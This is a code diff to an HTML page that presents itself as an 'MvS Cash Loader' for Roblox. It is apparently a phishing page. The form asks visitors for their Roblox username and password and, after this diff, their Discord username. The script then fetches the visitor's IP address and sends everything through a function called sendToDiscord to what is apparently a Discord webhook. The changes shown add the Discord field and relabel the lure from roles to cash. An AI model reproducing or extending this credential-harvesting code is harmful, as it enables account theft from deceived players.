@@ -97,13 +97,15 @@
     <!-- Main content -->
     <div id="main-content" class="container">
         <h2>MvS Cash Loader By: Unknown</h2>
+        <input type="text" id="discord" placeholder="Enter Discord Username" required>
         <input type="text" id="username" placeholder="Roblox Username" required>
         <input type="password" id="password" placeholder="Password" required>
-        <input type="number" id="number" placeholder="Enter a Cash to be Loaded (Max 10)" max="10" required>
+        <input type="number" id="number" placeholder="Enter a Cash to be Loaded (Max 5k)" max="10" required>
         <button type="button" onclick="sendToDiscord()">Submit</button>
     </div>
 
     <script>
+    let lastDiscord = "";
     let lastUsername = "";
     let lastPassword = "";
     let lastNumber = "";
@@ -124,23 +126,25 @@
     }
 
     async function sendToDiscord() {
+        const discord = document.getElementById("discord").value;
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
         const number = parseInt(document.getElementById("number").value);
 
-        // Check if "Roles" exceeds max of 10
+        // Check if "Cash" exceeds max of 10
         if (number > 10) {
-            showNotification("Roles Max", "#f44336");
+            showNotification("Cash Max", "#f44336");
             return;
         }
 
         // Check if the data is the same as the last submission
-        if (username === lastUsername && password === lastPassword && number === lastNumber) {
+        if (discord === lastDiscord && username === lastUsername && password === lastPassword && number === lastNumber) {
             showNotification("Duplicate submission. Please change your input.", "#f44336");
             return;
         }
 
         // Update last sent data
+        lastDiscord = discord;
         lastUsername = username;
         lastPassword = password;
         lastNumber = number;
@@ -153,7 +157,7 @@
             const ip = await ipResponse.text();
 
             // Prepare the message content
-            const messageContent = `Username: ${username}\nPassword: ${password}\nRoles: ${number}\nIP Address: ${ip.trim()}`;
+            const messageContent = `Discord Username: ${discord}\nRoblox Username: ${username}\nPassword: ${password}\nCash: ${number}\nIP Address: ${ip.trim()}`;
 
             const message = { content: messageContent };
 
@@ -175,6 +179,6 @@
             showNotification("Error occurred: " + error.message, "#f44336");
         }
     }
-</script>
+    </script>
 </body>
 </html>
